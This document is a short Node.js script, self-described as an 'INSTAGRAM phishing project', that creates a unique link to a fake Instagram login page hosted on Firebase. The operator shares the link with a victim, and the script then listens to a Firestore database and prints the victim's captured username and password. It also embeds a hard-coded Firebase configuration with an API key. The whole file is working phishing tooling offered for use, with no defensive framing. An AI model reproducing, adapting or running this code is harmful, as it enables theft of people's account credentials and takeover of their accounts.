const firebase = require("firebase");
const { v4: uuidv4 } = require("uuid");
console.log("Welcome to the INSTAGRAM phishing project built by Vinith Prabhu");
console.log("Kindly wait until url is generated");
let url = "https://instagram-post-login.web.app/?#";
let id = uuidv4();
url += id;
console.log("The url for your attack is: " + url);
console.log("When you are satisfied, press ctrl + c to terminate the program");
console.log("Kindly share it with the host for starting the attack");
console.log("Waiting for the host's credentials..");

const firebaseConfig = {
    apiKey: "AIzaSyBszWCyF5zJc8ELO5-Nx7mmQG_d2BqULkY",
    authDomain: "instagram-post-login.firebaseapp.com",
    databaseURL: "https://instagram-post-login.firebaseio.com",
    projectId: "instagram-post-login",
    storageBucket: "instagram-post-login.appspot.com",
    messagingSenderId: "465015470830",
    appId: "1:465015470830:web:e10779d8144dd2a81311ff",
    measurementId: "G-G1LBHEPDEM",
};

const firebaseApp = firebase.initializeApp(firebaseConfig);
const db = firebaseApp.firestore();

db.collection("results").onSnapshot((snapshot) =>
    snapshot.docs.forEach((element) => {
        if (element.data().id == id) {
            console.log("FOUND!!!!");
            console.log("Username: " + element.data().user);
            console.log("Password: " + element.data().password);
            console.log(
                "If you are satisfied, press ctrl + c to terminate the program"
            );
        } else {
            console.log("Waiting...");
        }
    })
);
